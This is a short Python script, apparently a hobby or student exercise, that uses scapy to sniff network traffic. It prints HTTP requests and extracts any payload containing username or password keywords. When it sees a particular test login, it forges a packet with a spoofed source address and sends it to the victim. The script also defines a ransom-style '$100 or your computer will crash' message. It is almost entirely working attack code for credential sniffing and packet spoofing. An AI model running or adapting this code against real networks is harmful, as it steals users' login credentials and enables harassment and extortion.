import scapy.all as scapy
from scapy import *
from scapy.interfaces import IFACES
from scapy_http import http

def sniff():
    # print("vsvs")
    # scapy.sniff(store=False,
    #             prn=process_sniffed_packet)
    scapy.sniff(store=False,
                prn=n_process)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    # print("xoxo")
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "uname",
                    "user", "login",
                    "password", "pass"]
        for keyword in keywords:
            if keyword.encode() in load:
                return load

                #print(rawPayload)

def n_process(packet):
    
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + url.decode("utf-8"))

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password > "
                  + login_info.decode()
                  + "\n\n")
            if (login_info.decode() == "uname=" + "000" + "&" + "pass=" + "123"):
                print("in")
                nPayload="You're Hacked ! ! ! ! ! !\nYou must transfer $100 to this account < nukcsie >\nOR!!!\n[Warning] : Your computer will crash forever"
                buffIpdst = packet.getlayer(scapy.IP).dst
                buffIpsrc = packet.getlayer(scapy.IP).src
                buffEthdst = packet.getlayer(layers.l2.Ether).dst
                buffEthsrc = packet.getlayer(layers.l2.Ether).src
                print("IP src: " + buffIpsrc)
                print("IP dst: " + buffIpdst)
                print("MAC src eth: " + buffEthsrc)
                print("MAC dst eth: " + buffEthdst)
                nEth = scapy.Ether(buffEthsrc) 
                nIp = scapy.IP(src ="192.168.0.1" ,dst=buffIpsrc,ttl=10)
                nTcp=scapy.TCP(sport=8888,dport=88)
                nPayload="You suck got hacked!!!"
                nPkt=nEth/nIp/nTcp/nPayload
                print(packet.getlayer(scapy.IP).dst)
                nPkt.show()
                scapy.send(nPkt)

sniff()